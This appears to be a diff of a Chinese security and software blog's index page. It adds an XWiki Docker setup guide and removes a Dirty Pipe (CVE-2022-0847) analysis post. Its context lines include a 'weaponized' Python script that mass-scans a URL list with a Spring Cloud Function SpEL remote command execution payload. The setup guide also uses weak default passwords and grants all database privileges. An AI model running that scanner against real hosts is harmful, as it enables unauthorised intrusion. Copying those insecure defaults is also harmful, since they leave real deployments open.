@@ -129,7 +129,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">28</span>
+          <span class="site-state-item-count">29</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -174,6 +174,116 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://hkirito.github.io/2024/05/22/Xwiki-Docker%E6%90%AD%E5%BB%BA%E5%8F%8A%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Sanwu">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sanwu">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/05/22/Xwiki-Docker%E6%90%AD%E5%BB%BA%E5%8F%8A%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/" class="post-title-link" itemprop="url">Xwiki-Docker搭建及问题解决</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2024-05-22 14:11:26 / Modified: 14:42:20" itemprop="dateCreated datePublished" datetime="2024-05-22T14:11:26+08:00">2024-05-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Software/" itemprop="url" rel="index"><span itemprop="name">Software</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="Xwiki-Docker搭建及问题解决"><a href="#Xwiki-Docker搭建及问题解决" class="headerlink" title="Xwiki-Docker搭建及问题解决"></a>Xwiki-Docker搭建及问题解决</h1><p>首先是明确你要搭建的版本，因为不同的版本对应的docker版本不同，而且官方的镜像也不一定完全契合，我先展示下现版本：</p>
+<p>XWiki 14 ~ 14.10.21<br>Xwiki 15 ~ 15.10.9<br>Xwiki 16 ~ 16.3.1</p>
+<p>每个版本都有不同的组件，一般有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">version-postgres-tomcat</span><br><span class="line">version-mysql-tomcat</span><br><span class="line">version-mariadb-tomcat</span><br><span class="line">lts-postgres-tomcat</span><br></pre></td></tr></table></figure>
+<p>区别其实在于其db不同，以及对应的tomcat版本不一样，这里坑比较大，希望各位注意一下</p>
+<p><code>1. 其中14对应支持的mysql的版本虽说已经更新到8.3，但是我在搭建过程中依然存在问题，实测版本可以改为5.7.44或5.7的其他版本</code><br><code>2. 版本15，16版本都支持mysql8.3，但是实测会存在部分问题，Its版本一般是最新版本的更新，追求安全的可以无脑拉取</code></p>
+<h3 id="1-Xwiki-Docker文件"><a href="#1-Xwiki-Docker文件" class="headerlink" title="1. Xwiki-Docker文件"></a>1. Xwiki-Docker文件</h3><p>准备文件：<code>docker-compose.yml</code>; <code>init.sql</code>;<code>.env</code><br>不同版本的docker-compose.yml文件几乎一致，不同的是<code>.env</code>文件<br><code>.env</code>文件中包含你需要设置的基本信息</p>
+<ol>
+<li><p><code>.env</code>文件</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Default environment values</span></span><br><span class="line"><span class="string">XWIKI_VERSION=14.10.18</span></span><br><span class="line"><span class="string">DB_USER=xwiki</span></span><br><span class="line"><span class="string">DB_PASSWORD=xwiki</span></span><br><span class="line"><span class="string">DB_DATABASE=xwiki</span></span><br><span class="line"><span class="string">MYSQL_ROOT_PASSWORD=xwiki</span></span><br></pre></td></tr></table></figure>
+<p>这个文件中包含你想安装的版本信息和数据库连接密码，重点注意版本号，版本号建议去hub.docker.com搜索是否存在你写的版本号，这个关系拉取的web镜像版本</p>
+</li>
+<li><p><code>docker-compose.yml</code>文件</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">bridge:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;xwiki:$&#123;XWIKI_VERSION&#125;-mysql-tomcat&quot;</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">xwiki-mysql-tomcat-web</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8080:8080&quot;</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_USER=xwiki</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_PASSWORD=xwiki</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">DB_HOST=xwiki-mysql-db</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">xwiki-data:/usr/local/xwiki</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">bridge</span></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;mysql:5.7.44&quot;</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">xwiki-mysql-db</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mysql-data:/var/lib/mysql</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./init.sql:/docker-entrypoint-initdb.d/init.sql</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_ROOT_PASSWORD=$&#123;MYSQL_ROOT_PASSWORD&#125;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_USER=$&#123;DB_USER&#125;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_PASSWORD=$&#123;DB_PASSWORD&#125;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">MYSQL_DATABASE=$&#123;DB_DATABASE&#125;</span></span><br><span class="line">    <span class="attr">command:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--character-set-server=utf8mb4&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--collation-server=utf8mb4_bin&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;--explicit-defaults-for-timestamp=1&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">bridge</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">mysql-data:</span> &#123;&#125;</span><br><span class="line">  <span class="attr">xwiki-data:</span> &#123;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的配置文件为官方推荐</p>
+</li>
+<li><p><code>init.sql</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> privileges <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">to</span> xwiki@<span class="string">&#x27;%&#x27;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="2-搭建Xwiki-Docker"><a href="#2-搭建Xwiki-Docker" class="headerlink" title="2. 搭建Xwiki-Docker"></a>2. 搭建Xwiki-Docker</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>如果没问题你可以使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
+<p>查看正在运行的docker container容器状态，如果均为up状态即搭建完成</p>
+<h3 id="3-问题解决"><a href="#3-问题解决" class="headerlink" title="3. 问题解决"></a>3. 问题解决</h3><p>如果出现</p>
+<ol>
+<li><p>出现web容器错误</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Setting environment variables</span><br><span class="line">Deploying XWiki <span class="keyword">in</span> the <span class="string">&#x27;ROOT&#x27;</span> context</span><br><span class="line">Replacing environment variables <span class="keyword">in</span> files</span><br><span class="line">Setting permanent directory...</span><br><span class="line">Configure libreoffice...</span><br><span class="line">Saving config file hibernate.cfg.xml...</span><br><span class="line">Saving config file xwiki.cfg...</span><br><span class="line">Saving config file xwiki.properties...</span><br><span class="line">Cannot find /usr/<span class="built_in">local</span>/tomcat/bin/setclasspath.sh</span><br><span class="line">This file is needed to run this program</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>在catalina.sh脚本中，导致问题的部分如下：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -r <span class="string">&quot;<span class="variable">$CATALINA_HOME</span>&quot;</span>/bin/setclasspath.sh ]; <span class="keyword">then</span></span><br><span class="line">    . <span class="string">&quot;<span class="variable">$CATALINA_HOME</span>&quot;</span>/bin/setclasspath.sh</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Cannot find <span class="variable">$CATALINA_HOME</span>/bin/setclasspath.sh&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;This file is needed to run this program&quot;</span></span><br></pre></td></tr></table></figure>
+A1：可以尝试使用docker –privileged启动容器<br>A2：更新 runc &gt;= 1.0.0-rc93<br>下载地址：<a target="_blank" rel="noopener" href="https://github.com/opencontainers/runc/releases/">https://github.com/opencontainers/runc/releases/</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">whereis runc  </span><br><span class="line">mv /usr/bin/runc /usr/bin/runc.bak   <span class="comment">#备份原runc文件</span></span><br><span class="line"><span class="built_in">cd</span> /data/make/runc/</span><br><span class="line">cp runc  /usr/bin/runc </span><br><span class="line">systemctl restart docker </span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>出现db容器错误<br> 当出现database数据版本不匹配，redo语句应不为空</p>
+<p> A1:是因为多次尝试其他版本导致overlay层修改，在目录卷中新指定要挂载的目录即可，就是将docker-compose.yml中的mysql-data重新指定一个卷，即可解决</p>
+ <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  <span class="attr">volumes:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">mysql-data:/var/lib/mysql</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1031,100 +1141,6 @@
 <h3 id="武器化"><a href="#武器化" class="headerlink" title="武器化"></a>武器化</h3><p>批量检测Poc脚本-(简单通过返回码及返回内容判断影响)</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">txt, cmd</span>):</span></span><br><span class="line">    path = <span class="string">&#x27;/functionRouter&#x27;</span></span><br><span class="line">    payload = <span class="string">f&#x27;T(java.lang.Runtime).getRuntime().exec(&quot;<span class="subst">&#123;cmd&#125;</span>&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line">    data = <span class="string">&#x27;data&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;spring.cloud.function.routing-expression&#x27;</span>: payload,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    f = <span class="built_in">open</span>(txt)</span><br><span class="line">    urllist = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urllist:</span><br><span class="line">        url = url.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">all</span> = url + path</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req = requests.post(url=<span class="built_in">all</span>, headers=headers, data=data, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">            code = req.status_code</span><br><span class="line">            text = req.text</span><br><span class="line">            rsp = <span class="string">&#x27;&quot;error&quot;:&quot;Internal Server Error&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> code == <span class="number">500</span> <span class="keyword">and</span> rsp <span class="keyword">in</span> text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[+]<span class="subst">&#123;url&#125;</span> 存在漏洞&#x27;</span>)</span><br><span class="line">                poc_file = <span class="built_in">open</span>(<span class="string">&#x27;succ.txt&#x27;</span>, <span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">                poc_file.write(url + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                poc_file.close()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;[-]<span class="subst">&#123;url&#125;</span> 不存在漏洞&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[-]<span class="subst">&#123;url&#125;</span> 检测超时&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[-]<span class="subst">&#123;url&#125;</span> 检测异常&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd1 = sys.argv[<span class="number">1</span>]</span><br><span class="line">        t = threading.Thread(target=test(cmd1, <span class="string">&#x27;whoami&#x27;</span>))</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;用法：&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;python XXX.py target.txt&#x27;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;exit![0]&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
 
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://hkirito.github.io/2022/03/25/DirtyPipe%E5%AD%A6%E4%B9%A0%E5%88%86%E6%9E%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Sanwu">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Sanwu">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/03/25/DirtyPipe%E5%AD%A6%E4%B9%A0%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">DirtyPipe学习分析</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2022-03-25 00:24:09" itemprop="dateCreated datePublished" datetime="2022-03-25T00:24:09+08:00">2022-03-25</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2022-03-27 22:06:08" itemprop="dateModified" datetime="2022-03-27T22:06:08+08:00">2022-03-27</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Network-Safety/" itemprop="url" rel="index"><span itemprop="name">Network-Safety</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="Dirty-Pipe学习"><a href="#Dirty-Pipe学习" class="headerlink" title="Dirty Pipe学习"></a>Dirty Pipe学习</h1><h4 id="漏洞编号："><a href="#漏洞编号：" class="headerlink" title="漏洞编号："></a>漏洞编号：</h4><p><code>CVE-2022-0847</code></p>
-<h4 id="漏洞影响："><a href="#漏洞影响：" class="headerlink" title="漏洞影响："></a>漏洞影响：</h4><p>linux内核权限提升</p>
-<h4 id="原理直击："><a href="#原理直击：" class="headerlink" title="原理直击："></a>原理直击：</h4><p>在 <code>splice</code> 中建立完页面映射后，此时 head 会指向下一个 <code>pipe_buffer</code>，此时我们再向管道中写入数据，管道计数器会发现上一个 <code>pipe_buffer</code> 没有写满，从而<strong>将数据拷贝到上一个 <strong><code>pipe_buffer</code></strong> 对应的页面——即文件映射的页面</strong>，由于 <code>PIPE_BUF_FLAG_CAN_MERGE</code> 仍保留着，因此<strong>内核会误以为该页面可以被写入</strong>，从而完成了越权写入文件的操作</p>
-<p><code>splice</code>系统调用中<strong>未清空</strong> <code>pipe_buffer</code> <strong>的标志位，从而将管道页面可写入的状态保留了下来</strong>，当然也就有了越权读写的能力，但是无法在文件的边界进行读写。</p>
-<h4 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h4><p>来自：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/11016</span><br><span class="line"></span><br><span class="line">原理是先将一个一个管道完全写满后读出一遍，为了给每个pipe_buffer上标志位，这个标志位可以让后面读取一个字节的文件进行读写操作。也就是越权读写，但是无法在文件的边界进行读写，因为这个边界也是对应pipe_buffer的边界，当其位于边界时无法触发管道读写的&quot;优化&quot;操作。也就无法进入到pipe_buffer的那个页面映射。</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="POC演示"><a href="#POC演示" class="headerlink" title="POC演示"></a>POC演示</h4><p><img src="/2022/03/25/DirtyPipe%E5%AD%A6%E4%B9%A0%E5%88%86%E6%9E%90/image.png" alt="POC"></p>
-<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>来源</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://haxx.in/files/dirtypipez.c</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<p>EXP演示</p>
-<p><img src="/2022/03/25/DirtyPipe%E5%AD%A6%E4%B9%A0%E5%88%86%E6%9E%90/image_1.png" alt="EXP"></p>
 
       
     </div>
